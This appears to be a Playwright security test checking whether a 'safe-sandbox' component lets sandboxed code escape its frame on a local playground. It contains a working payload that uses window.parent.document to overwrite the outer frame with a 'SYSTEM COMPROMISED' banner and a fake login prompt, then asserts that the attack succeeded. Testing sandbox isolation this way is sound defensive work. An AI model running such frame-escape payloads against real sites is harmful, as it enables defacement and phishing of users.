import { test, expect } from '@playwright/test';

test('Outer Frame DOM Tampering', async ({ page }) => {
  // 1. Setup
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);
  await page.evaluate(() => window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true'));
  await page.waitForTimeout(2000);

  // 2. Exploit: Access window.parent and modify DOM
  // Because inner-frame has 'allow-same-origin', it can access outer-frame (sandbox.localhost).

  const payload = `
    try {
        const outerDoc = window.parent.document;
        // Check if we can write to it
        outerDoc.body.innerHTML = '<h1 id="pwned">SYSTEM COMPROMISED</h1><div id="fake-login">Login to continue...</div>';
        outerDoc.body.style.backgroundColor = 'red';

        window.top.postMessage({ type: 'PWN_SUCCESS' }, '*');
    } catch (e) {
        window.top.postMessage({ type: 'ERROR', message: e.message }, '*');
    }
  `;

  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, payload);

  // 3. Verify: Check the sandbox element content from the host
  // The sandbox element contains the outer-frame. We need to check inside the shadowRoot?
  // No, the outer-frame is in the Shadow DOM of <safe-sandbox>.
  // But Playwright can select into iframes.

  // Wait for signal
  await page.evaluate(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_SUCCESS') resolve(true);
          });
      });
  });

  // Check the visual change
  const frameElement = await page.$('safe-sandbox');
  // We can't easily query inside the cross-origin iframe (from host perspective) via DOM API without cross-origin issues
  // unless we use Playwright's frame locator.
  // The outer frame IS cross-origin to localhost:3333 (it is sandbox.localhost).

  // Use Playwright to access the frame
  const outerFrame = page.frame({ url: /outer-frame.html/ });
  expect(outerFrame).not.toBeNull();

  const h1 = await outerFrame.$('#pwned');
  expect(h1).not.toBeNull();
  const text = await h1.textContent();
  expect(text).toBe('SYSTEM COMPROMISED');

  console.log("Exploit Success: Outer Frame DOM modified.");
});
